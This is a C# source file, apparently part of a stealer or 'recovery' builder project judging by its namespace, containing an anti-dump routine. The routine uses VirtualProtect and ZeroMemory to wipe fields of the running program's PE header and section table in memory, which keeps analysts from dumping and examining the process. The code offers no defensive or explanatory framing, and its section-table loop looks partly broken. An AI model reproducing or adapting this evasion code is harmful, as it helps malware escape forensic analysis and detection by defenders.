namespace DaddyRecoveryBuilder.Injectors
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    internal static class DumpEx
    {
        internal static class NativeMethods
        {
            [DllImport("kernel32.dll")]
            internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

            [DllImport("kernel32.dll")]
            internal static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);
        }

        internal static void EraseSection(IntPtr address, int size)
        {
            IntPtr sz = (IntPtr)size, dwOld = default, temp = default;
            NativeMethods.VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
            NativeMethods.ZeroMemory(address, sz);
            NativeMethods.VirtualProtect(address, sz, dwOld, ref temp);
        }
        internal static void Protection()
        {
            using var process = Process.GetCurrentProcess();
            IntPtr base_address = process.MainModule.BaseAddress;
            int dwpeheader = Marshal.ReadInt32((IntPtr)(base_address.ToInt32() + 0x3C));
            var peheaderwords = new List<int>() { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
            for (int i = 0; i < peheaderwords.Count; i++)
            {
                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderwords[i]), 1);
            }

            var peheaderbytes = new List<int>() { 0x1A, 0x1B };
            for (int i = 0; i < peheaderbytes.Count; i++)
            {
                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderbytes[i]), 2);
            }

            int x = 0, y = 0;

            short wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address.ToInt32() + dwpeheader + 0x6));
            do
            {
                if (y == 0)
                {
                    EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x) + 0x20), 2);
                }

                y++;

                var sectiontabledwords = new List<int>() { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
                if (y == sectiontabledwords.Count)
                {
                    x++;
                    y = 0;
                }
            } while (x <= wnumberofsections);
        }
    }
}